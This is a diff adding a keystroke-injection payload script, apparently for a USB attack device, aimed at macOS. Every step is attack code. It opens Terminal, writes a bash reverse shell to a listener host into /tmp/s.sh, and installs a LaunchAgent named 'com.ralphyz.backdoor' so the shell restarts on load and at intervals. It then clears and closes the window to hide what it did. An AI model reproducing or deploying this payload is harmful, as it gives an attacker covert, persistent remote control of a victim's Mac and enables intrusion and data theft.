@@ -1,0 +1,35 @@
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN OSX terminal
+
+
+GUI SPACE
+STRING terminal
+DELAY 500
+ENTER
+
+REM Give the terminal window a second to pop up
+DELAY 1000
+
+REM Bash Reverse Shell into a script 's.sh'
+STRING echo \"bash -i \>\& /dev/tcp/${LISTENER_IP}/${LISTENER_PORT} 0\>\&1\" \> /tmp/s.sh
+ENTER
+DELAY 500
+
+REM Change file permissions to allow execution
+STRING chmod +x /tmp/s.sh
+ENTER
+DELAY 500
+
+REM Add to the Launch Agents
+STRING printf \"\<plist version=\\\"1.0\\\"\>\<dict\>\<key\>Label\</key\>\<string\>com.ralphyz.backdoor\</string\>\<key\>ProgramArguments\</key\>\<array\>\<string\>/bin/sh\</string\>\<string\>/tmp/s.sh\</string\>\</array\>\<key\>RunAtLoad\</key\>\<true/\>\<key\>StartInterval\</key\>\<integer\>${FREQUENCY}\</integer\>\<key\>AbandonProcessGroup\</key\>\<true/\>\</dict\>\\n\</plist\>\" \> \~/Library/LaunchAgents/com.ralphyz.backdoor.plist
+ENTER
+DELAY 500
+
+REM Load the new Launch Agent - establishing persistence - and clear the terminal
+STRING launchctl load com.ralphyz.backdoor.plist \&\& clear
+ENTER
+
+REM Close the Terminal Window
+GUI q
